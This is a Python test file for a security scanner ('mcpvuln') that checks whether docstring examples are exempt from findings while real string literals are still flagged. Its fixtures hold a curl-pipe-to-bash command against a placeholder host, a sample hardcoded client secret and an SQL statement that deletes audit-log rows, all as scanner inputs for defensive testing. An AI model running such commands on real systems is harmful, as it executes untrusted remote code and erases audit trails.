"""Docstrings are documentation; ordinary string literals are configuration.

``allow_in_string`` exists so that a shell command, SQL statement, path or URL
written inside a string is still seen. A docstring is never any of those, and
treating it as one meant every documented usage example containing
``client_secret="..."`` was reported as a hardcoded credential. These tests hold
the line on both sides of that distinction.
"""

import textwrap

from mcpvuln.vuln_analyzer import VulnerabilityAnalyzer, context_weight


def cats(src, path="app.py"):
    return {f.category for f in
            VulnerabilityAnalyzer().analyze(textwrap.dedent(src), path)}


DOCSTRING_WITH_SECRET = '''
def make_provider():
    """Build a provider.

    Example:
        provider = ClientCredentialsOAuthProvider(
            client_id="my-client-id",
            client_secret="my-client-secret",
        )
    """
    return None
'''

DOCSTRING_WITH_SHELL = '''
def helper():
    """Never do this: curl https://example.invalid/i.sh | bash"""
    return 1
'''


def test_credential_in_a_docstring_example_is_not_a_finding():
    assert "hardcoded_secrets" not in cats(DOCSTRING_WITH_SECRET)


def test_shell_pipeline_in_a_docstring_is_not_a_finding():
    assert "supply_chain" not in cats(DOCSTRING_WITH_SHELL)


def test_credential_in_a_real_assignment_is_still_a_finding():
    """The docstring fix must not blind the rule to an actual credential."""
    assert "hardcoded_secrets" in cats('client_secret = "Xk29fMbQ7pLw03ZzRt55Aa"\n')


def test_shell_pipeline_in_a_real_string_is_still_a_finding():
    assert "supply_chain" in cats('cmd = "curl https://example.invalid/i.sh | bash"\n')


def test_sql_against_audit_log_in_a_string_is_still_a_finding():
    assert "audit_integrity" in cats('q = "DELETE FROM audit_logs WHERE id = 1"\n')


def test_single_quoted_multiline_docstring_is_also_suppressed():
    src = "def f():\n    '''client_secret = \"abcdefghijklmnop123\"'''\n    return 1\n"
    assert "hardcoded_secrets" not in cats(src)


def test_raw_and_prefixed_docstrings_are_suppressed():
    src = 'def f():\n    r"""curl https://example.invalid/x.sh | bash"""\n    return 1\n'
    assert "supply_chain" not in cats(src)


def test_documentation_source_trees_are_down_weighted():
    """docs_src, snippets and tutorial files are documentation whatever the suffix."""
    baseline = context_weight("src/app.py")
    for path in ("docs_src/identity/tutorial001.py",
                 "examples/snippets/clients/demo.py",
                 "docs/guide.md",
                 "tutorial002.py",
                 "i18n/ja/pages/x.md"):
        assert context_weight(path) < baseline, path


def test_ordinary_source_paths_keep_full_weight():
    assert context_weight("src/mcp/server/app.py") == 1.0
    assert context_weight("mcpvuln/pipeline.py") == 1.0
